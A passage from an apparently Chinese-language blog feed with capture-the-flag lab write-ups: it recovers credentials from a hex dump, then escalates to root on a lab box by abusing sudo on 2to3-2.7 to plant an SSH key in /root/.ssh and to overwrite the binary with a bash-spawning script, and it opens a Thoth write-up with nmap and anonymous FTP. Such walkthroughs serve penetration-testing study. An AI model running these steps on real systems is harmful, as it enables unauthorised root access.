class="string">3f46</span> <span class="string">69b7</span>  [<span class="string">i&gt;4.z..A</span>&#125;<span class="string">Im?Fi.</span></span><br><span class="line"><span class="attr">00000590:</span> <span class="string">afd4</span> <span class="string">dfda</span> <span class="string">766b</span> <span class="string">e763</span> <span class="number">9275 </span><span class="string">90eb</span> <span class="string">95de</span> <span class="string">471a</span>  <span class="string">....vk.c.u....G.</span></span><br><span class="line"><span class="attr">000005a0:</span> <span class="string">bf5f</span> <span class="number">5288 </span><span class="string">1f4d</span> <span class="string">b7f3</span> <span class="number">6753 </span><span class="string">bdd3</span> <span class="string">69d3</span> <span class="string">f1e8</span>  <span class="string">._R..M..gS..i...</span></span><br><span class="line"><span class="attr">000005b0:</span> <span class="string">c392</span> <span class="string">3bf3</span> <span class="string">f3e5</span> <span class="string">e9c5</span> <span class="string">0cbf</span> <span class="string">ffbe</span> <span class="string">85de</span> <span class="string">0ea2</span>  <span class="string">..;.............</span></span><br><span class="line"><span class="attr">000005c0:</span> <span class="number">0655 </span><span class="string">97f4</span> <span class="string">ba5d</span> <span class="string">d487</span> <span class="string">06dd</span> <span class="string">6fa6</span> <span class="string">eb3b</span> <span class="string">4b0a</span>  <span class="string">.U...</span>]<span class="string">....o..;K.</span></span><br><span class="line"><span class="attr">000005d0:</span> <span class="string">b07c</span> <span class="string">fba9</span> <span class="string">dfab</span> <span class="string">9ece</span> <span class="string">80ba</span> <span class="number">05e8</span> <span class="string">d2a4</span> <span class="string">e843</span>  <span class="string">.|.............C</span></span><br><span class="line"><span class="attr">000005e0:</span> <span class="string">092d</span> <span class="string">7a4d</span> <span class="string">b43e</span> <span class="string">98d8</span> <span class="string">77ae</span> <span class="string">fd65</span> <span class="string">abbf</span> <span class="string">bffc</span>  <span class="string">.-zM.&gt;..w..e....</span></span><br><span class="line"><span class="attr">000005f0:</span> <span class="string">d725</span> <span class="string">fab7</span> <span class="string">abb4</span> <span class="string">804a</span> <span class="string">1e3d</span> <span class="string">8eb8</span> <span class="string">beda</span> <span class="string">f441</span>  <span class="string">.%.....J.=.....A</span></span><br><span class="line"><span class="attr">00000600:</span> <span class="string">6daf</span> <span class="number">0e78</span> <span class="string">b3d5</span> <span class="string">f663</span> <span class="string">d27a</span> <span class="string">1ac7</span> <span class="string">ee31</span> <span class="string">97ea</span>  <span class="string">m..x...c.z...1..</span></span><br><span class="line"><span class="attr">00000610:</span> <span class="string">1dbd</span> <span class="string">d4fc</span> <span class="string">5f63</span> <span class="string">94d5</span> <span class="string">eeaf</span> <span class="string">f6cd</span> <span class="string">9be7</span> <span class="string">37ff</span>  <span class="string">...._c........7.</span></span><br><span class="line"><span class="attr">00000620:</span> <span class="string">054f</span> <span class="string">6d3f</span> <span class="string">06cd</span> <span class="string">476d</span> <span class="string">3dd1</span> <span class="string">1c68</span> <span class="number">2e34</span> <span class="string">27d7</span>  <span class="string">.Om?..Gm=..h.4&#x27;.</span></span><br><span class="line"><span class="attr">00000630:</span> <span class="string">d315</span> <span class="string">d3fd</span> <span class="string">74d5</span> <span class="string">a27a</span> <span class="string">dd75</span> <span class="string">55db</span> <span class="string">8fda</span> <span class="string">766b</span>  <span class="string">....t..z.uU...vk</span></span><br><span class="line"><span class="attr">00000640:</span> <span class="string">fb3b</span> <span class="string">6ebb</span> <span class="string">a3cc</span> <span class="string">ef28</span> <span class="string">f54a</span> <span class="string">efa3</span> <span class="string">fc81</span> <span class="string">913e</span>  <span class="string">.;n....(.J.....&gt;</span></span><br><span class="line"><span class="attr">00000650:</span> <span class="string">f155</span> <span class="string">5f14</span> <span class="string">ba7a</span> <span class="string">5d77</span> <span class="string">7f73</span> <span class="number">6231 </span><span class="string">c34f</span> <span class="number">6790</span>  <span class="string">.U_..z</span>]<span class="string">w.sb1.Og.</span></span><br><span class="line"><span class="attr">00000660:</span> <span class="string">fc17</span> <span class="string">1e1a</span> <span class="string">586d</span> <span class="string">1a6c</span> <span class="string">fdff</span> <span class="string">e92d</span> <span class="string">6da5</span> <span class="number">9626</span>  <span class="string">....Xm.l...-m..&amp;</span></span><br><span class="line"><span class="attr">00000670:</span> <span class="string">43cf</span> <span class="string">57f4</span> <span class="string">3b6d</span> <span class="string">fa74</span> <span class="string">4acf</span> <span class="number">2206 </span><span class="string">797e</span> <span class="string">a9b9</span>  <span class="string">C.W.;m.tJ.&quot;.y~..</span></span><br><span class="line"><span class="attr">00000680:</span> <span class="string">d5d5</span> <span class="string">d9ae</span> <span class="string">a4bf</span> <span class="string">bfe7</span> <span class="string">b637</span> <span class="string">0ba3</span> <span class="string">4b0f</span> <span class="string">b0b5</span>  <span class="string">.........7..K...</span></span><br><span class="line"><span class="attr">00000690:</span> <span class="string">0fed</span> <span class="string">6b2d</span> <span class="string">fafa</span> <span class="string">80ce</span> <span class="string">9c35</span> <span class="string">0ba3</span> <span class="string">dbae</span> <span class="string">ae14</span>  <span class="string">..k-.....5......</span></span><br><span class="line"><span class="attr">000006a0:</span> <span class="string">153e</span> <span class="string">3b3a</span> <span class="string">b744</span> <span class="string">596d</span> <span class="string">7ffb</span> <span class="string">f534</span> <span class="string">7e1a</span> <span class="string">c7fe</span>  <span class="string">.&gt;;:.DYm...4~...</span></span><br><span class="line"><span class="attr">000006b0:</span> <span class="string">314f</span> <span class="string">737f</span> <span class="string">a571</span> <span class="number">2995 </span><span class="number">75e7</span> <span class="string">77d4</span> <span class="string">764b</span> <span class="string">f321</span>  <span class="string">1Os..q).u.w.vK.!</span></span><br><span class="line"><span class="attr">000006c0:</span> <span class="string">b5f5</span> <span class="string">321d</span> <span class="string">8fae</span> <span class="string">ba72</span> <span class="string">fdee</span> <span class="string">baaa</span> <span class="string">ed87</span> <span class="string">d4b4</span>  <span class="string">..2....r........</span></span><br><span class="line"><span class="attr">000006d0:</span> <span class="string">5bdb</span> <span class="string">df49</span> <span class="string">daad</span> <span class="string">9ddf</span> <span class="string">49d7</span> <span class="string">c14a</span> <span class="string">ba33</span> <span class="string">503d</span>  [<span class="string">..I....I..J.3P=</span></span><br><span class="line"><span class="attr">000006e0:</span> <span class="string">6d7f</span> <span class="string">dc6d</span> <span class="number">6e85</span> <span class="string">4bc7</span> <span class="number">3707 </span><span class="string">16ff</span> <span class="string">b677</span> <span class="number">91e9</span>  <span class="string">m..mn.K.7....w..</span></span><br><span class="line"><span class="attr">000006f0:</span> <span class="string">eca9</span> <span class="string">f0d3</span> <span class="number">4219 </span><span class="string">c5ce</span> <span class="string">147a</span> <span class="string">ba32</span> <span class="string">292d</span> <span class="number">3e00</span>  <span class="string">....B....z.2)-&gt;.</span></span><br><span class="line"><span class="attr">00000700:</span> <span class="number">5508 </span><span class="string">bf8d</span> <span class="string">a46f</span> <span class="string">e1eb</span> <span class="string">01b7</span> <span class="number">9e33</span> <span class="string">d6d2</span> <span class="string">37eb</span>  <span class="string">U....o.....3..7.</span></span><br><span class="line"><span class="attr">00000710:</span> <span class="string">f525</span> <span class="string">d4fd</span> <span class="string">e996</span> <span class="string">7c8e</span> <span class="string">1e1e</span> <span class="string">038b</span> <span class="string">86f0</span> <span class="string">9b77</span>  <span class="string">.%....|........w</span></span><br><span class="line"><span class="attr">00000720:</span> <span class="string">fae4</span> <span class="string">4e9f</span> <span class="string">025f</span> <span class="string">b8d6</span> <span class="string">7c63</span> <span class="string">5eb7</span> <span class="string">10fa</span> <span class="string">d6bf</span>  <span class="string">..N.._..|c^.....</span></span><br><span class="line"><span class="attr">00000730:</span> <span class="number">9e15</span> <span class="number">0218 </span><span class="string">1be1</span> <span class="string">37ef</span> <span class="string">f477</span> <span class="string">927a</span> <span class="string">a8ac</span> <span class="string">bfaa</span>  <span class="string">......7..w.z....</span></span><br><span class="line"><span class="attr">00000740:</span> <span class="string">d0a6</span> <span class="string">af3f</span> <span class="string">ccd1</span> <span class="number">2766 </span><span class="string">c0a2</span> <span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">...?..&#x27;f..&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000750:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000760:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000770:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000780:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000790:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007a0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007b0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007c0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007d0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007e0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">000007f0:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000800:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000810:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000820:</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span> <span class="number">0058 </span><span class="string">22fc</span>  <span class="string">.X&quot;..X&quot;..X&quot;..X&quot;.</span></span><br><span class="line"><span class="attr">00000830:</span> <span class="number">0018 </span><span class="string">8af8</span> <span class="number">1765 </span><span class="string">703a</span> <span class="string">66dc</span> <span class="string">e967</span> <span class="string">bc00</span> <span class="number">0000</span>  <span class="string">.....ep:f..g....</span></span><br><span class="line"><span class="attr">00000840:</span> <span class="number">0049 </span><span class="string">454e</span> <span class="string">44ae</span> <span class="number">4260 </span><span class="number">82</span>                   <span class="string">.IEND.B`.</span></span><br><span class="line">                                                            </span><br><span class="line"><span class="string">┌──(root㉿kakeru)-</span>[<span class="string">~/tmp</span>]</span><br><span class="line"><span class="string">└─#</span> <span class="string">xxd</span> <span class="string">-r</span> <span class="string">tmp</span> <span class="string">&gt;</span> <span class="string">tmp.png</span></span><br></pre></td></tr></table></figure></div>
<p>可以得到一个png<br>在本机查看之后得到用户名和密码<br><img src="https://pic1.imgdb.cn/item/67b9a490d0e0a243d40205b1.png"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> lover on <span class="symbol">light:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> lover may run the following commands on <span class="symbol">light:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/<span class="number">2</span>to3<span class="number">-2.7</span></span><br></pre></td></tr></table></figure></div>
<p>有一个sudo权限，发现这个命令是用来转换python文件的 输入–help可以查看参数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">lover@light:~$ sudo /usr/bin/<span class="number">2</span>to3<span class="number">-2.7</span> <span class="comment">--help</span></span><br><span class="line">Usage: <span class="number">2</span>to3 [options] <span class="built_in">file</span>|dir ...</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -h, <span class="comment">--help            show this help message and exit</span></span><br><span class="line">  -d, <span class="comment">--doctests_only   Fix up doctests only</span></span><br><span class="line">  -f FIX, <span class="comment">--fix=FIX     Each FIX specifies a transformation; default: all</span></span><br><span class="line">  -j PROCESSES, <span class="comment">--processes=PROCESSES</span></span><br><span class="line">                        Run <span class="number">2</span>to3 concurrently</span><br><span class="line">  -x NOFIX, <span class="comment">--nofix=NOFIX</span></span><br><span class="line">                        Prevent <span class="keyword">a</span> transformation <span class="built_in">from</span> being run</span><br><span class="line">  -l, <span class="comment">--list-fixes      List available transformations</span></span><br><span class="line">  -p, <span class="comment">--print-function  Modify the grammar so that print() is a function</span></span><br><span class="line">  -v, <span class="comment">--verbose         More verbose logging</span></span><br><span class="line">  <span class="comment">--no-diffs            Don&#x27;t show diffs of the refactoring</span></span><br><span class="line">  -w, <span class="comment">--write           Write back modified files</span></span><br><span class="line">  -n, <span class="comment">--nobackups       Don&#x27;t write backups for modified files</span></span><br><span class="line">  -o OUTPUT_DIR, <span class="comment">--output-dir=OUTPUT_DIR</span></span><br><span class="line">                        Put output <span class="built_in">files</span> <span class="keyword">in</span> this <span class="built_in">directory</span> instead <span class="keyword">of</span></span><br><span class="line">                        overwriting <span class="keyword">the</span> input <span class="built_in">files</span>.  Requires -n.</span><br><span class="line">  -W, <span class="comment">--write-unchanged-files</span></span><br><span class="line">                        Also <span class="built_in">write</span> <span class="built_in">files</span> even <span class="keyword">if</span> no changes were required</span><br><span class="line">                        (useful <span class="keyword">with</span> <span class="comment">--output-dir); implies -w.</span></span><br><span class="line">  <span class="comment">--add-suffix=ADD_SUFFIX</span></span><br><span class="line">                        Append this <span class="keyword">string</span> <span class="built_in">to</span> all output filenames. Requires</span><br><span class="line">                        -n <span class="keyword">if</span> non-<span class="literal">empty</span>.  ex: <span class="comment">--add-suffix=&#x27;3&#x27; will generate</span></span><br><span class="line">                        .py3 <span class="built_in">files</span>.</span><br></pre></td></tr></table></figure></div>
<p>这里有一个<code>-W</code>命令就有很多方法了，这是可以强制写入文件的<br>第一种方式，可以写入公钥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCSS"><figure class="iseeu highlight /scss"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-<span class="selector-attr">[~/.ssh]</span></span><br><span class="line">└─# cat id_ed25519<span class="selector-class">.pub</span></span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root<span class="keyword">@kakeru</span></span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ASCIIDOC"><figure class="iseeu highlight /asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root@kakeru</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">print &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这里这么写的意义是让三个引号解析成python的注释，然后下面的print “” 是python2的语法，可以出发转换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">lover@light:~$ nano authorized_keys </span><br><span class="line"></span><br><span class="line">lover@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2.7</span> -o /root/.ssh/ -w -n authorized_keys </span><br><span class="line">lib2to3.main: Output <span class="keyword">in</span> <span class="comment">&#x27;/root/.ssh/&#x27; will mirror the input directory &#x27;&#x27; layout.</span></span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: buffer</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: idioms</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: set_literal</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Skipping <span class="keyword">optional</span> fixer: ws_comma</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Refactored authorized_keys</span><br><span class="line">--- authorized_keys	(original)</span><br><span class="line">+++ authorized_keys	(refactored)</span><br><span class="line">@@ -<span class="number">2</span>,<span class="number">4</span> +<span class="number">2</span>,<span class="number">4</span> @@</span><br><span class="line"> ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMwgCkwvKHNNuKBU4ICulTRkebSliiCn8+mnEiF5eBnI root@kakeru</span><br><span class="line"> <span class="comment">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line">-print <span class="string">&quot;&quot;</span></span><br><span class="line">+print(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Writing converted authorized_keys <span class="keyword">to</span> /root/.ssh/authorized_keys.</span><br><span class="line"><span class="symbol">RefactoringTool:</span> Files that were modified:</span><br><span class="line"><span class="symbol">RefactoringTool:</span> authorized_keys</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里的-o就是指定输出到的文件夹，这样我们就把自己的私钥写入&#x2F;root&#x2F;.ssh里面了<br>然后我们就可以用自己的私钥登录了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVESCRIPT"><figure class="iseeu highlight /livescript"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/.ssh]</span><br><span class="line">└─<span class="comment"># ssh root@192.168.112.81 -i id_ed25519                  </span></span><br><span class="line">Linux light <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 <span class="comment">#1 SMP Debian 4.19.152-1 (2020-10-18) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="regexp">/usr/share/doc/</span>*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Fri Nov <span class="number">13</span> <span class="number">03</span>:<span class="number">40</span>:<span class="number">09</span> <span class="number">2020</span></span><br><span class="line">root@light:~<span class="comment"># </span></span><br></pre></td></tr></table></figure></div>

<p>第二种方法： 强制修改文件<br>这里&#x2F;usr&#x2F;bin&#x2F;2to3-2.7是有sudo权限的文件，我们如果能把这里的文件内容修改成自己想要的内容，那不是就可以sudo了吗</p>
<p>思路就是我们在当前文件夹下面创建一个同名文件，然后给执行权限，用-W强制写入<br>先看看原来的内容，尽量保持一致</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">lover@light:~$ cat <span class="regexp">/usr/</span>bin/<span class="number">2</span>to3-<span class="number">2.7</span> </span><br><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line">import sys</span><br><span class="line">from lib2to3.main import main</span><br><span class="line"></span><br><span class="line">sys.<span class="keyword">exit</span>(main(<span class="string">&quot;lib2to3.fixes&quot;</span>))</span><br></pre></td></tr></table></figure></div>
<p>那我们写的时候也要加上这个注释</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>touch  <span class="number">2</span>to3<span class="number">-2.7</span></span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>nano <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>chmod +x <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line">lover<span class="variable">@light</span><span class="symbol">:~</span><span class="variable">$ </span>cat <span class="number">2</span>to3<span class="number">-2.7</span> </span><br><span class="line"><span class="comment">#! /usr/bin/python2.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>然后写入到&#x2F;usr&#x2F;bin目录下面，强制替换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">lover</span>@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span>  -W -n -o /usr/bin <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">WARNING</span>: --write-unchanged-files/-W implies -w.</span><br><span class="line"><span class="attribute">lib2to3</span>.main: Output in &#x27;/usr/bin&#x27; will mirror the input directory &#x27;&#x27; layout.</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: buffer</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: idioms</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: set_literal</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Skipping optional fixer: ws_comma</span><br><span class="line"><span class="attribute">RefactoringTool</span>: No changes to <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">RefactoringTool</span>: Writing converted <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span> to /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span>.</span><br><span class="line"><span class="attribute">RefactoringTool</span>: Files that were modified:</span><br><span class="line"><span class="attribute">RefactoringTool</span>: <span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">lover</span>@light:~$ sudo /usr/bin/<span class="number">2</span>to3-<span class="number">2</span>.<span class="number">7</span> </span><br><span class="line"><span class="attribute">root</span>@light:/home/lover# </span><br></pre></td></tr></table></figure></div>

<p>最后还有一种方法是python库劫持，看这个2to3用到了什么库，然后修改这个库里面的某个函数，这里我就不写出来了</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulunhub-Thoth</title>
    <url>/posts/35034.html</url>
    <content><![CDATA[<p>Vulunhub-Thoth靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a0487cd0e0a243d4f9a729.png"></p>
<h1 id="端口扫描-信息收集"><a href="#端口扫描-信息收集" class="headerlink" title="端口扫描&#x2F;信息收集"></a>端口扫描&#x2F;信息收集</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap 192.168.240.0/24 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">03</span> <span class="number">11</span>:<span class="number">38</span> CST</span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.46</span>)</span><br><span class="line">Host is up (<span class="number">0.00039</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span> open  ftp</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http</span><br><span class="line">MAC <span class="params">Address:</span> FA:DB:E5:E9:<span class="number">94</span>:F7 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.52</span>)</span><br><span class="line">Host is up (<span class="number">0.010</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line"><span class="number">53</span><span class="symbol">/tcp</span>   open     domain</span><br><span class="line"><span class="number">8081</span><span class="symbol">/tcp</span> filtered blackice-icecap</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:ED:<span class="number">9</span>D:<span class="number">97</span>:DA:<span class="number">7</span>E (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.82</span>)</span><br><span class="line">Host is up (<span class="number">0.00020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh</span><br><span class="line"><span class="number">5000</span><span class="symbol">/tcp</span> open  upnp</span><br><span class="line"><span class="number">5001</span><span class="symbol">/tcp</span> open  commplex-link</span><br><span class="line"><span class="number">7000</span><span class="symbol">/tcp</span> open  afs3-fileserver</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">3</span>A:<span class="number">03</span>:<span class="number">50</span>:<span class="number">5</span>A:<span class="number">8</span>C:DF (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for bogon (<span class="number">192.168</span>.<span class="number">240.83</span>)</span><br><span class="line">Host is up (<span class="number">0.0000040</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">999</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh</span><br><span class="line"></span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">5.36</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放了ssh html ftp  并且html也只有一个apache默认界面<br>看看ftp服务能不能匿名登录<br>发现可以登录并且有一个note.txt 说明我们要利用ftp<br>用get把这个文件下载到本地看看什么内容</p>
